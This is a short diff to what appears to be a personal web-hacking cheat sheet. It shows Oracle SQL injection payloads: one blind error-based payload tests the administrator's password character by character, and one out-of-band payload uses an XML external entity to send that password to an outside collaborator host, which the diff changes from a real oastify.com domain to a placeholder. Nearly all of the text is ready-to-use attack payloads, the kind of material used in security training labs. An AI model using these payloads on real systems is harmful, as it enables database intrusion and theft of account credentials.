@@ -17,7 +17,7 @@
 '||+(select+case+when+(substr(password,1,1)%3d'a')+then+to_char(1/0)+else+null+end+from+users+where+username%3d+'administrator')+||' --> Oracle
 
 -- Data extraction
-'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username = 'administrator')||'.k3o4dx4jnq53r2893kghw2siy940srgg.oastify.com/"> %remote;]>'),'/l') FROM dual)||' --> oracle
+'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username = 'administrator')||'.<your-collaborator>/"> %remote;]>'),'/l') FROM dual)||' --> oracle
 ```
 
 # XSS
